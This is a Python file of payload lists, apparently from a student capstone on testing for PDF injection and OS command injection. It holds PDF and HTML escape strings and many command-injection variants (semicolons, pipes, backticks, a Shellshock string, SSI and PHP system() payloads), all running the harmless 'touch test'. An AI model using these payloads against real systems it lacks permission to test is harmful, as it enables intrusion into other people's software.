"""
File: py_payloads.py
Assignment: MS Capstone
Lanuguage: PHP
Author: Sean Kells <spk3077@rit.edu>
Description: List of Payloads to exploit OS Command Injection and PDF Injection
"""

escape_seq: list = [
#  OBJECT ESCAPE
"hacker\\",
"hacker)",
"hacker\\)",
"hacker\\\\",
"hacker\xE2\x9C\x94",
"hacker\xF0\x9F\x8D\xA3",
"hacker\xE2\x98\xBA",
"hacker\xE2\x9D\xA4",
"hacker\xF0\x9F\x8C\xB8",
"hacker&rpar;",
"hacker&#41;",
"hacker&bsol;",
"hacker&#92;",
"hacker󶶜",
"hacker✓",
"hackerܮ",
"hacker ܏ ",
"hackerܢ ",
" hacker© ",
"hacker Ʃ ",
"hacker⩾",
"hackerΩ",
"hackerω",
"hacker💩",
"hackerỨ",
"hackerứ",
"hacker↩",
"hackerÉ",
"hackeré",
"hacker𝐩",
"hacker𝑩",
"hacker𐩥",
"hackerʩ",
"hacker⍩",
"hacker🀩",
"hacker𐢩",
"hacker╩",
"hacker%%EOF",
"hacker\x00",
"hacker	",
"hacker\x0C",
"hacker\x0A",
# Text Object Escape
'''hacker\\)] TJ ET
endstream''',
''''hacker\\\\)] TJ ET
endstream''',
'''hacker\\)] TJ ET
endstream''',
'''hacker󶶜] TJ ET
endstream''',
'''hacker󶶜] TJ ET
endstream''',
'''hacker✓] TJ ET
endstream''',
'''hacker✓] TJ ET
endstream''',
'''hackerܮ] TJ ET
endstream''',
'''hackerܮ] TJ ET
endstream''',
'''hacker ܏ ] TJ ET
endstream''',
'''hacker ܏ ] TJ ET
endstream''',
'''hackerܢ ] TJ ET
endstream''',
'''hackerܢ ] TJ ET
endstream''',
'''hacker)] TJ ET
endstream''',
'''hacker©] TJ ET
endstream''',
'''hackerƩ] TJ ET
endstream''',
'''hacker⩾] TJ ET
endstream''',
'''hackerΩ] TJ ET
endstream''',
'''hackerω] TJ ET
endstream''',
'''hacker💩] TJ ET
endstream''',
'''hackerỨ] TJ ET
endstream''',
'''hackerứ] TJ ET
endstream''',
'''hacker↩] TJ ET
endstream''',
'''hackerÉ] TJ ET
endstream''',
'''hackeré] TJ ET
endstream''',
'''hacker𝐩] TJ ET
endstream''',
'''hacker𝑩] TJ ET
endstream''',
'''hacker𐩥] TJ ET
endstream''',
'''hackerʩ] TJ ET
endstream''',
'''hacker⍩] TJ ET
endstream''',
'''hacker🀩] TJ ET
endstream''',
'''hacker𐢩] TJ ET
endstream''',
'''hacker╩] TJ ET
endstream''',
'''hacker%%EOF)] TJ ET
endstream''',
'''hacker\x00)] TJ ET
endstream''',
'''hacker	)] TJ ET
endstream''',
'''hacker\x0C)] TJ ET
endstream''',
'''hacker\x0A)] TJ ET
endstream''',
# HTML ESCAPE (Target links)
'''<a href='hacker\\'>hacker\\</a>''',
'''<a href='hacker)'>hacker)</a>''',
'''<a href='hacker\\)'>hacker\\)</a>''',
'''<a href='hacker\\\\'>hacker\\\\</a>''',
'''<a href='hacker\xE2\x9C\x94'>hacker\xE2\x9C\x94</a>''',
'''<a href='hacker\xF0\x9F\x8D\xA3'>hacker\xF0\x9F\x8D\xA3</a>''',
'''<a href='hacker\xE2\x98\xBA'>hacker\xE2\x98\xBA</a>''',
'''<a href='hacker\xE2\x9D\xA4'>hacker\xE2\x9D\xA4</a>''',
'''<a href='hacker\xF0\x9F\x8C\xB8'>hacker\xF0\x9F\x8C\xB8</a>''',
'''<a href='hacker&rpar;'>hacker&rpar;</a>''',
'''<a href='hacker&#41;'>hacker&#41;</a>''',
'''<a href='hacker&bsol;'>hacker&bsol;</a>''',
'''<a href='hacker&#92;'>hacker&#92;</a>''',
'''<a href='hacker󶶜'>hacker󶶜</a>''',
'''<a href='hacker✓'>hacker✓</a>''',
'''<a href='hackerܮ'>hackerܮ</a>''',
'''<a href='hacker ܏ '>hacker ܏ </a>''',
'''<a href='hackerܢ '>hackerܢ </a>''',
'''<a href='hacker©'>hacker©</a>''',
'''<a href='hacker Ʃ'>hacker Ʃ</a>''',
'''<a href='hacker⩾'>hacker⩾</a>''',
'''<a href='hackerΩ'>hackerΩ</a>''',
'''<a href='hackerω'>hackerω</a>''',
'''<a href='hacker💩'>hacker💩</a>''',
'''<a href='hackerỨ'>hackerỨ</a>''',
'''<a href='hackerứ'>hackerứ</a>''',
'''<a href='hacker↩'>hacker↩</a>''',
'''<a href='hackerÉ'>hackerÉ</a>''',
'''<a href='hackeré'>hackeré</a>''',
'''<a href='hacker𝐩'>hacker𝐩</a>''',
'''<a href='hacker𝑩'>hacker𝑩</a>''',
'''<a href='hacker𐩥'>hacker𐩥</a>''',
'''<a href='hackerʩ'>hackerʩ</a>''',
'''<a href='hacker⍩'>hacker⍩</a>''',
'''<a href='hacker🀩'>hacker🀩</a>''',
'''<a href='hacker𐢩'>hacker𐢩</a>''',
'''<a href='hacker╩'>hacker╩</a>''',
'''<a href='hacker%%EOF'>hacker%%EOF</a>''',
'''<a href='hacker\x00'>hacker\x00</a>''',
'''<a href='hacker	'>hacker	</a>''',
'''<a href='hacker\x0C'>hacker\x0C</a>''',
'''<a href='hacker\x0A'>hacker\x0A</a>'''
]

os_commands: list = [
"touch test",
" touch test",
";touch test;",
"; touch test;",
";touch test",
"; touch test",
";system('touch test')",
"; system('touch test')",
"|touch test",
"| touch test",
"|touch test;",
"| touch test;",
"&& touch test",
" && touch test",
"a && touch test",
"a && touch test;",
"1 && touch test",
"1 && touch test;",
"1' && touch test",
"1' && touch test;",
"1' && touch test#",
"a' && touch test",
"a' && touch test;",
"a' && touch test#",
'1" && touch test',
'1" && touch test;',
'1" && touch test#',
'a" && touch test',
'a" && touch test;',
'a" && touch test#',
"& touch test",
" & touch test",
"`touch test`",
"`touch test`",
"a);touch test",
"a;touch test",
"a);touch test;",
"a;touch test;",
"a);touch test|",
"a;touch test|",
"a)|touch test",
"a|touch test",
"a)|touch test;",
"a|touch test",
"&lt;!--#exec%20cmd=&quot;touch%20test&quot;--&gt;",
"&lt;!--#exec%20cmd=&quot;touch%20test;--&gt;",
"%0Atouch%20test",
"%0Atouch%20test%0A",
"$;touch test",
'() { :;}; bash -c "sleep 100 && touch test"',
'() { :;}; bash -c "touch test"',
"$(`touch test`)",
'<!--#exec cmd="touch test";-->',
'<?php system("touch test");?>',
"touch test #",
"touch test#",
" touch test #",
" touch test#"
]